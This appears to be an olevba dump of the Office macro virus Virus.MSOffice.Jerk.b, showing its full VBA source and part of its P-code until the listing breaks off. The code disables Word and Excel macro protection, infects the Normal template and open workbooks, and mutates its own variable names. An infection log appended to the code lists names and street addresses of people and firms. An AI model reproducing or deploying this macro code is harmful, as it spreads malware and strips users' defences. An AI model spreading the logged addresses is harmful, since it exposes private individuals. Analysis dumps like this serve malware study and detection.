olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' 03:52:49: 오후 - Monday, 8 Nov 1999
' 조병현
'

































Private Sub Workbook_Deactivate()
On Error Resume Next
Const JJSCLQOYY = 1, SPRQV = True, GWUNWRL = False, PWAODAHUPV = 0
Dim XOVGG, RATDE As String
Dim QJDYRTTFQPABTXO, QFWDYJTSW As Integer
Dim TLIFV As Boolean
RATDE = "ThisWorkbook"
XOVGG = Application.ThisWorkbook.VBProject.VBComponents.Item(JJSCLQOYY).codemodule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(JJSCLQOYY).codemodule.CountOfLines)
Call UWPTVQZQBH(XOVGG)
For QJDYRTTFQPABTXO = JJSCLQOYY To Application.Workbooks.Count
TLIFV = GWUNWRL
For QFWDYJTSW = JJSCLQOYY To Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Count
If Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.CountOfLines = PWAODAHUPV Then
If Application.Workbooks.Item(QJDYRTTFQPABTXO).Path <> "" And Application.Workbooks.Item(QJDYRTTFQPABTXO).Saved = SPRQV And TLIFV = GWUNWRL Then TLIFV = SPRQV
Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.InsertLines JJSCLQOYY, XOVGG
If Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).Name = RATDE Then
Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.ReplaceLine JJSCLQOYY * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.ReplaceLine JJSCLQOYY * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next QFWDYJTSW
If TLIFV = SPRQV Then Application.Workbooks.Item(QJDYRTTFQPABTXO).Save
Next QJDYRTTFQPABTXO
End Sub
Private Sub Document_Close()
On Error Resume Next
Const SPRQV = True, GWUNWRL = False, PWAODAHUPV = 0, JJSCLQOYY = 1, BBQYAYDHQDLAS = wdFormatDocument, JHVJWVLIWJL = wdFormatTemplate, GTOYNYL = ":"
Dim TLIFV, JCIOGLQ, KRFJRBSHCJK, YMDKDPYQSJM As Boolean
Dim SJMTIBIDBOZY, CKUWLVFNSN As Object
Dim JUDYXAATGQHODP, XOVGG As String
If Month(JJSCLQOYY * Now) > JJSCLQOYY * 2 + JJSCLQOYY * 3 And Day(JJSCLQOYY * Now) = 4 + JJSCLQOYY * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set SJMTIBIDBOZY = ActiveDocument.VBProject.VBComponents.Item(JJSCLQOYY)
Set CKUWLVFNSN = NormalTemplate.VBProject.VBComponents.Item(JJSCLQOYY)
Randomize
KRFJRBSHCJK = GWUNWRL
YMDKDPYQSJM = GWUNWRL
If SJMTIBIDBOZY.codemodule.CountOfLines <> PWAODAHUPV Then KRFJRBSHCJK = SPRQV
If CKUWLVFNSN.codemodule.CountOfLines <> PWAODAHUPV Then YMDKDPYQSJM = SPRQV
Options.VirusProtection = GWUNWRL
If (KRFJRBSHCJK = SPRQV Xor YMDKDPYQSJM = SPRQV) And (ActiveDocument.SaveFormat = BBQYAYDHQDLAS Or ActiveDocument.SaveFormat = JHVJWVLIWJL) Then
If KRFJRBSHCJK = SPRQV Then
JCIOGLQ = NormalTemplate.Saved
XOVGG = SJMTIBIDBOZY.codemodule.Lines(JJSCLQOYY, SJMTIBIDBOZY.codemodule.CountOfLines)
Call WJSEFKVJJAXOYH(XOVGG)
If Int(Rnd * 10 * JJSCLQOYY) = JJSCLQOYY * 7 Then Call WXBKXZLPIZXDIJ(XOVGG)
Call RZYEJOJ(XOVGG)
CKUWLVFNSN.codemodule.InsertLines JJSCLQOYY, XOVGG
If JCIOGLQ = SPRQV Then NormalTemplate.Save
End If
JUDYXAATGQHODP = Mid(ActiveDocument.FullName, 2, JJSCLQOYY)
If YMDKDPYQSJM = SPRQV And (JUDYXAATGQHODP = GTOYNYL Or ActiveDocument.Saved = GWUNWRL) Then
TLIFV = ActiveDocument.Saved
XOVGG = CKUWLVFNSN.codemodule.Lines(JJSCLQOYY, CKUWLVFNSN.codemodule.CountOfLines)
Call RZYEJOJ(XOVGG)
SJMTIBIDBOZY.codemodule.InsertLines JJSCLQOYY, XOVGG
If TLIFV = SPRQV Then ActiveDocument.Save
End If
End If
End Sub
Private Sub WXBKXZLPIZXDIJ(ByRef XOVGG As String)
On Error Resume Next
Const YFYLO = 48, GNINRCIJTGZJAS = 15, ZVSZYI = 5, BURWUC = 65, LNOJAASHJY = 90, JJSCLQOYY = 1, SPRQV = True, GWUNWRL = False
Dim XMQNYDYG, XVVPHPCETmp, RDFMJCLWLKEW, XVVPHPCE(JJSCLQOYY To YFYLO), XVVPHPCE2(JJSCLQOYY To YFYLO) As String
Dim QJDYRTTFQPABTXO, QFWDYJTSW, JSKYJ As Integer
Dim QOCQXBNSB As Boolean
XMQNYDYG = "XOVGG YFYLO XVVPHPCE XVVPHPCE2 RDFMJCLWLKEW QJDYRTTFQPABTXO QFWDYJTSW JSKYJ QOCQXBNSB WXBKXZLPIZXDIJ GNINRCIJTGZJAS ZVSZYI BURWUC LNOJAASHJY JJSCLQOYY XMQNYDYG XVVPHPCETmp TLIFV JCIOGLQ KRFJRBSHCJK YMDKDPYQSJM SJMTIBIDBOZY CKUWLVFNSN WJSEFKVJJAXOYH VODUOLTM HXLNFVNTH BKZVFFYA EGRDMONPL VODUOLTMTmp OFEBXELAYKTDUS IXRCGOQZVJPW JUDYXAATGQHODP SPRQV GWUNWRL PWAODAHUPV BBQYAYDHQDLAS JHVJWVLIWJL GVKBEKCBLBWPL TRDVPZE GTOYNYL SLXKDPOD HUWZTP RATDE UWPTVQZQBH RZYEJOJ LRGPOCBFUHXTHTT YQXDOHRTDNJ NQMHDECBCMRDRU"
Randomize
QFWDYJTSW = JJSCLQOYY
For QJDYRTTFQPABTXO = JJSCLQOYY To Len(XMQNYDYG)
If Mid(XMQNYDYG, QJDYRTTFQPABTXO, JJSCLQOYY) = " " Or QJDYRTTFQPABTXO = Len(XMQNYDYG) Then
If QJDYRTTFQPABTXO = Len(XMQNYDYG) Then XVVPHPCETmp = XVVPHPCETmp & Mid(XMQNYDYG, QJDYRTTFQPABTXO, JJSCLQOYY)
For JSKYJ = JJSCLQOYY To Int((GNINRCIJTGZJAS - ZVSZYI + JJSCLQOYY) * Rnd + ZVSZYI)
XVVPHPCE2(QFWDYJTSW) = XVVPHPCE2(QFWDYJTSW) & Chr(Int((LNOJAASHJY - BURWUC + JJSCLQOYY) * Rnd + BURWUC))
Next JSKYJ
XVVPHPCE(QFWDYJTSW) = XVVPHPCETmp
XVVPHPCETmp = ""
QFWDYJTSW = QFWDYJTSW + JJSCLQOYY
Else
XVVPHPCETmp = XVVPHPCETmp & Mid(XMQNYDYG, QJDYRTTFQPABTXO, JJSCLQOYY)
End If
Next QJDYRTTFQPABTXO
QOCQXBNSB = GWUNWRL
For QJDYRTTFQPABTXO = JJSCLQOYY To Len(XOVGG)
For QFWDYJTSW = JJSCLQOYY To YFYLO
If Mid(XOVGG, QJDYRTTFQPABTXO, Len(XVVPHPCE(QFWDYJTSW))) = XVVPHPCE(QFWDYJTSW) Then
RDFMJCLWLKEW = RDFMJCLWLKEW & XVVPHPCE2(QFWDYJTSW)
QJDYRTTFQPABTXO = QJDYRTTFQPABTXO + Len(XVVPHPCE(QFWDYJTSW)) - JJSCLQOYY
QOCQXBNSB = SPRQV
Exit For
End If
Next QFWDYJTSW
If QOCQXBNSB = GWUNWRL Then
RDFMJCLWLKEW = RDFMJCLWLKEW & Mid(XOVGG, QJDYRTTFQPABTXO, JJSCLQOYY)
Else
QOCQXBNSB = GWUNWRL
End If
Next QJDYRTTFQPABTXO
XOVGG = RDFMJCLWLKEW
End Sub
Private Sub WJSEFKVJJAXOYH(ByRef XOVGG As String)
On Error Resume Next
Const EGRDMONPL = "' ", JJSCLQOYY = 1
Const GVKBEKCBLBWPL = "hh:mm:ss: AMPM - ", TRDVPZE = "dddd, d mmm yyyy"
Dim VODUOLTMTmp, VODUOLTM, OFEBXELAYKTDUS, IXRCGOQZVJPW, HXLNFVNTH, BKZVFFYA As String
Dim QJDYRTTFQPABTXO As Integer
HXLNFVNTH = Chr(10 * JJSCLQOYY + 3)
VODUOLTM = Application.UserAddress
IXRCGOQZVJPW = Format(Time, GVKBEKCBLBWPL) & Format(Date, TRDVPZE)
BKZVFFYA = Chr(JJSCLQOYY * 10)
OFEBXELAYKTDUS = Application.UserName
For QJDYRTTFQPABTXO = JJSCLQOYY To Len(VODUOLTM)
If Mid(VODUOLTM, QJDYRTTFQPABTXO, JJSCLQOYY) <> HXLNFVNTH Then
If Mid(VODUOLTM, QJDYRTTFQPABTXO, JJSCLQOYY) <> BKZVFFYA Then
VODUOLTMTmp = VODUOLTMTmp & Mid(VODUOLTM, QJDYRTTFQPABTXO, JJSCLQOYY)
End If
Else
VODUOLTMTmp = VODUOLTMTmp & HXLNFVNTH & EGRDMONPL
End If
Next QJDYRTTFQPABTXO
XOVGG = XOVGG & HXLNFVNTH & EGRDMONPL & IXRCGOQZVJPW & HXLNFVNTH & EGRDMONPL & OFEBXELAYKTDUS & HXLNFVNTH & EGRDMONPL & VODUOLTM & HXLNFVNTH
End Sub
Private Sub RZYEJOJ(ByVal XOVGG As String)
On Error Resume Next
Dim NQMHDECBCMRDRU As Long
Dim SLXKDPOD As Object
Dim LRGPOCBFUHXTHTT, YQXDOHRTDNJ As String
LRGPOCBFUHXTHTT = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
NQMHDECBCMRDRU = &H0
YQXDOHRTDNJ = "Options6"
System.PrivateProfileString("", LRGPOCBFUHXTHTT, YQXDOHRTDNJ) = NQMHDECBCMRDRU
Set SLXKDPOD = GetObject(, "Excel.Application")
Const JJSCLQOYY = 1, PWAODAHUPV = 0
Dim RATDE As String
Dim QJDYRTTFQPABTXO, QFWDYJTSW As Integer
RATDE = "ThisWorkbook"
For QJDYRTTFQPABTXO = JJSCLQOYY To SLXKDPOD.Application.Workbooks.Count
For QFWDYJTSW = JJSCLQOYY To SLXKDPOD.Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Count
If SLXKDPOD.Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.CountOfLines = PWAODAHUPV Then
SLXKDPOD.Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.InsertLines JJSCLQOYY, XOVGG
If SLXKDPOD.Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).Name = RATDE Then
SLXKDPOD.Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.ReplaceLine 33 * JJSCLQOYY, "Private Sub Workbook_Deactivate()"
Else
SLXKDPOD.Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.ReplaceLine JJSCLQOYY * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next QFWDYJTSW
Next QJDYRTTFQPABTXO
Set SLXKDPOD = Nothing
End Sub
Private Sub UWPTVQZQBH(ByVal XOVGG As String)
On Error Resume Next
Const SPRQV = True, GWUNWRL = False, JJSCLQOYY = 1, PWAODAHUPV = 0
Dim HUWZTP As Object
Dim JCIOGLQ As Boolean
Set HUWZTP = GetObject(, "Word.Application")
If HUWZTP.NormalTemplate.VBProject.VBComponents.Item(JJSCLQOYY).codemodule.CountOfLines = PWAODAHUPV Then
JCIOGLQ = HUWZTP.NormalTemplate.Saved
HUWZTP.Options.VirusProtection = GWUNWRL
HUWZTP.NormalTemplate.VBProject.VBComponents.Item(JJSCLQOYY).codemodule.InsertLines JJSCLQOYY, XOVGG
If JCIOGLQ = SPRQV Then HUWZTP.NormalTemplate.Save
End If
Set HUWZTP = Nothing
End Sub

' 09:50:58:  - Saturday, 13 Apr 1997
' Fred Cohen
' fc@all.net

' 10:10:57: AM - Sunday, 21 Feb 1999
' Jeff Goldstein
'

' 01:16:33: PM - Monday, 1 Mar 1999
' Custis Colelman
'

' 04:34:58: PM - Monday, 8 Mar 1999
' Marc Benson
'

' 05:12:25: PM - Monday, 24 May 1999
' Caroline Hartsock
' Caroline M. Hartsock
3863 Rodman Street, N.W., #54
Washington, D.C.  20016

' 10:57:30: AM - Wednesday, 2 Jun 1999
' Mary A. Downs
' Tucker Flyer
1615 L Street, N.W.
Washington, D.C.  20036-5612

' 09:41:28: AM - Thursday, 3 Jun 1999
' Christy A. Tolbert
' Tucker, Flyer & Lewis
1615 L Street, N.W.
Washington, D.C.  20036-5610

' 02:21:55: PM - Tuesday, 8 Jun 1999
' Mary S. Calkins
' COVENANT UNITED METHODIST CHURCH
20301 Pleasant Ridge Drive
Montgomery Village, MD  20886

' 05:03:09: PM - Wednesday, 9 Jun 1999
' Carol B. Friend
'

' 06:16:12: PM - Friday, 11 Jun 1999
' Preferred Customer
'

' 07:27:45: PM - Wednesday, 23 Jun 1999
' Wayne G. Travell
' Tucker, Flyer & Lewis
1615 L Street, N.W.
Washington, D.C.  20036-5610

' 10:30:08: AM - Thursday, 24 Jun 1999
' Nicole E. Dysart
' Tucker Flyer, P.C.
1615 L Street, N.W.
Washington, D.C.  20036-5610

' 12:23:33: PM - Wednesday, 30 Jun 1999
' Jane L. Johansen
' Tucker Flyer
1615 L Street, N.W.
Washington, D.C.  20036-5612

' 06:43:55: PM - Tuesday, 6 Jul 1999
' Kendal Tyre
'

' 07:31:17: AM - Wednesday, 7 Jul 1999
' jlo
'

' 11:13:56: AM - Thursday, 8 Jul 1999
' Deborah Quinn
'

' 01:54:29: PM - Friday, 9 Jul 1999
' Library
'

' 05:54:56: PM - Monday, 12 Jul 1999
' Outlook
'

' 10:48:41: AM - Friday, 16 Jul 1999
' PSINet
'

' 03:18:33: PM - Monday, 2 Aug 1999
' PSINet
'

' 10:43:05: 오후 - Tuesday, 31 Aug 1999
' 조병현
'

' 08:35:53: 오후 - Wednesday, 3 Nov 1999
' 조병현
'

' 07:48:42: 오후 - Wednesday, 1 Dec 1999
' 김경민
'

' 10:16:09: 오전 - Wednesday, 26 Jan 2000
' 조병현
'

' 02:03:07: 오후 - Tuesday, 4 Jul 2000
' 허욱헌
'

' 05:11:11: 오후 - Wednesday, 26 Jul 2000
' YJ Shin
'

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Jerk.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 19385 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0024 " 03:52:49: 오후 - Monday, 8 Nov 1999"
' Line #2:
' 	QuoteRem 0x0000 0x0007 " 조병현"
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' 	FuncDefn (Private Sub Workbook_Deactivate())
' Line #38:
' 	OnError (Resume Next) 
' Line #39:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn JJSCLQOYY
' 	LitVarSpecial (True)
' 	VarDefn SPRQV
' 	LitVarSpecial (False)
' 	VarDefn GWUNWRL
' 	LitDI2 0x0000 
' 	VarDefn PWAODAHUPV
' Line #40:
' 	Dim 
' 	VarDefn XOVGG
' 	VarDefn RATDE (As String)
' Line #41:
' 	Dim 
' 	VarDefn QJDYRTTFQPABTXO
' 	VarDefn QFWDYJTSW (As Integer)
' Line #42:
' 	Dim 
' 	VarDefn TLIFV (As Boolean)
' Line #43:
' 	LitStr 0x000C "ThisWorkbook"
' 	St RATDE 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld JJSCLQOYY 
' 	Ld Application 
' 	MemLd ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld JJSCLQOYY 
' 	Ld Application 
' 	MemLd ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St XOVGG 
' Line #45:
' 	Ld XOVGG 
' 	ArgsCall (Call) UWPTVQZQBH 0x0001 
' Line #46:
' 	StartForVariable 
' 	Ld QJDYRTTFQPABTXO 
' 	EndForVariable 
' 	Ld JJSCLQOYY 
' 	Ld Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	For 
' Line #47:
' 	Ld GWUNWRL 
' 	St TLIFV 
' Line #48:
' 	StartForVariable 
' 	Ld QFWDYJTSW 
' 	EndForVariable 
' 	Ld JJSCLQOYY 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #49:
' 	Ld QFWDYJTSW 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld PWAODAHUPV 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld QJDYRTTFQPABTXO 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	Ld SPRQV 
' 	Eq 
' 	And 
' 	Ld TLIFV 
' 	Ld GWUNWRL 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld SPRQV 
' 	St TLIFV 
' 	EndIf 
' Line #51:
' 	Ld JJSCLQOYY 
' 	Ld XOVGG 
' 	Ld QFWDYJTSW 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #52:
' 	Ld QFWDYJTSW 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld RATDE 
' 	Eq 
' 	IfBlock 
' Line #53:
' 	Ld JJSCLQOYY 
' 	LitDI2 0x0021 
' 	Mul 
' 	LitStr 0x0021 "Private Sub Workbook_Deactivate()"
' 	Ld QFWDYJTSW 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	Ld JJSCLQOYY 
' 	LitDI2 0x0021 
' 	Mul 
' 	LitStr 0x0022 "Private Sub Worksheet_Deactivate()"
' 	Ld QFWDYJTSW 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld QFWDYJTSW 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	Ld TLIFV 
' 	Ld SPRQV 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld QJDYRTTFQPABTXO 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #60:
' 	StartForVariable 
' 	Ld QJDYRTTFQPABTXO 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Private Sub Document_Close())
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	Dim (Const) 
' 	LitVarSpecial (True)
' 	VarDefn SPRQV
' 	LitVarSpecial (False)
' 	VarDefn GWUNWRL
' 	LitDI2 0x0000 
' 	VarDefn PWAODAHUPV
' 	LitDI2 0x0001 
' 	VarDefn JJSCLQOYY
' 	Ld wdFormatDocument 
' 	VarDefn BBQYAYDHQDLAS
' 	Ld wdFormatTemplate 
' 	VarDefn JHVJWVLIWJL
' 	LitStr 0x0001 ":"
' 	VarDefn GTOYNYL
' Line #65:
' 	Dim 
' 	VarDefn TLIFV
' 	VarDefn JCIOGLQ
' 	VarDefn KRFJRBSHCJK
' 	VarDefn YMDKDPYQSJM (As Boolean)
' Line #66:
' 	Dim 
' 	VarDefn SJMTIBIDBOZY
' 	VarDefn CKUWLVFNSN (As Object)
' Line #67:
' 	Dim 
' 	VarDefn JUDYXAATGQHODP
' 	VarDefn XOVGG (As String)
' Line #68:
' 	Ld JJSCLQOYY 
' 	Ld Now 
' 	Mul 
' 	ArgsLd Month 0x0001 
' 	Ld JJSCLQOYY 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld JJSCLQOYY 
' 	LitDI2 0x0003 
' 	Mul 
' 	Add 
' 	Gt 
' 	Ld JJSCLQOYY 
' 	Ld Now 
' 	Mul 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0004 
' 	Ld JJSCLQOYY 
' 	LitDI2 0x000A 
' 	Mul 
' 	Add 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "V guvax "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " vf n ovt fghcvq wrex!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x000B "www.all.net"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #69:
' 	SetStmt 
' 	Ld JJSCLQOYY 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set SJMTIBIDBOZY 
' Line #70:
' 	SetStmt 
' 	Ld JJSCLQOYY 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set CKUWLVFNSN 
' Line #71:
' 	ArgsCall Read 0x0000 
' Line #72:
' 	Ld GWUNWRL 
' 	St KRFJRBSHCJK 
' Line #73:
' 	Ld GWUNWRL 
' 	St YMDKDPYQSJM 
' Line #74:
' 	Ld SJMTIBIDBOZY 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld PWAODAHUPV 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld SPRQV 
' 	St KRFJRBSHCJK 
' 	EndIf 
' Line #75:
' 	Ld CKUWLVFNSN 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld PWAODAHUPV 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld SPRQV 
' 	St YMDKDPYQSJM 
' 	EndIf 
' Line #76:
' 	Ld GWUNWRL 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #77:
' 	Ld KRFJRBSHCJK 
' 	Ld SPRQV 
' 	Eq 
' 	Ld YMDKDPYQSJM 
' 	Ld SPRQV 
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld BBQYAYDHQDLAS 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld JHVJWVLIWJL 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #78:
' 	Ld KRFJRBSHCJK 
' 	Ld SPRQV 
' 	Eq 
' 	IfBlock 
' Line #79:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St JCIOGLQ 
' Line #80:
' 	Ld JJSCLQOYY 
' 	Ld SJMTIBIDBOZY 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld SJMTIBIDBOZY 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St XOVGG 
' Line #81:
' 	Ld XOVGG 
' 	ArgsCall (Call) WJSEFKVJJAXOYH 0x0001 
' Line #82:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	Ld JJSCLQOYY 
' 	Mul 
' 	FnInt 
' 	Ld JJSCLQOYY 
' 	LitDI2 0x0007 
' 	Mul 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld XOVGG 
' 	ArgsCall (Call) WXBKXZLPIZXDIJ 0x0001 
' 	EndIf 
' Line #83:
' 	Ld XOVGG 
' 	ArgsCall (Call) RZYEJOJ 0x0001 
' Line #84:
' 	Ld JJSCLQOYY 
' 	Ld XOVGG 
' 	Ld CKUWLVFNSN 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #85:
' 	Ld JCIOGLQ 
' 	Ld SPRQV 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	Ld JJSCLQOYY 
' 	ArgsLd Mid$ 0x0003 
' 	St JUDYXAATGQHODP 
' Line #88:
' 	Ld YMDKDPYQSJM 
' 	Ld SPRQV 
' 	Eq 
' 	Ld JUDYXAATGQHODP 
' 	Ld GTOYNYL 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld GWUNWRL 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #89:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St TLIFV 
' Line #90:
' 	Ld JJSCLQOYY 
' 	Ld CKUWLVFNSN 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld CKUWLVFNSN 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St XOVGG 
' Line #91:
' 	Ld XOVGG 
' 	ArgsCall (Call) RZYEJOJ 0x0001 
' Line #92:
' 	Ld JJSCLQOYY 
' 	Ld XOVGG 
' 	Ld SJMTIBIDBOZY 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #93:
' 	Ld TLIFV 
' 	Ld SPRQV 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndSub 
' Line #97:
' 	FuncDefn (Private Sub WXBKXZLPIZXDIJ(ByRef XOVGG As String))
' Line #98:
' 	OnError (Resume Next) 
' Line #99:
' 	Dim (Const) 
' 	LitDI2 0x0030 
' 	VarDefn YFYLO
' 	LitDI2 0x000F 
' 	VarDefn GNINRCIJTGZJAS
' 	LitDI2 0x0005 
' 	VarDefn ZVSZYI
' 	LitDI2 0x0041 
' 	VarDefn BURWUC
' 	LitDI2 0x005A 
' 	VarDefn LNOJAASHJY
' 	LitDI2 0x0001 
' 	VarDefn JJSCLQOYY
' 	LitVarSpecial (True)
' 	VarDefn SPRQV
' 	LitVarSpecial (False)
' 	VarDefn GWUNWRL
' Line #100:
' 	Dim 
' 	VarDefn XMQNYDYG
' 	VarDefn XVVPHPCETmp
' 	VarDefn RDFMJCLWLKEW
' 	Ld JJSCLQOYY 
' 	Ld YFYLO 
' 	VarDefn XVVPHPCE
' 	Ld JJSCLQOYY 
' 	Ld YFYLO 
' 	VarDefn XVVPHPCE2 (As String)
' Line #101:
' 	Dim 
' 	VarDefn QJDYRTTFQPABTXO
' 	VarDefn QFWDYJTSW
' 	VarDefn JSKYJ (As Integer)
' Line #102:
' 	Dim 
' 	VarDefn QOCQXBNSB (As Boolean)
' Line #103:
